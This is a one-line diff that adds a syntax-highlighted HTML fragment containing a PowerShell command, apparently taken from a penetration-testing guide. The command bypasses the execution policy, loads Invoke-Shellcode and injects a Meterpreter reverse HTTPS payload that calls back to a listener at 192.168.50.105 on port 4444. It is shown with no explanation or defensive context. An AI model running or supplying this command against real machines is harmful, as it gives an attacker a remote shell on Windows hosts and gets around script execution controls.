@@ -1,0 +1,1 @@
+powershell.exe <span class="sy0">-</span>exec bypass <span class="kw5">-Command</span> <span class="st0">&quot;&amp; {Import-Module .\Invoke-Shellcode.ps1; Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.50.105 -Lport 4444 -Force}&quot;</span>
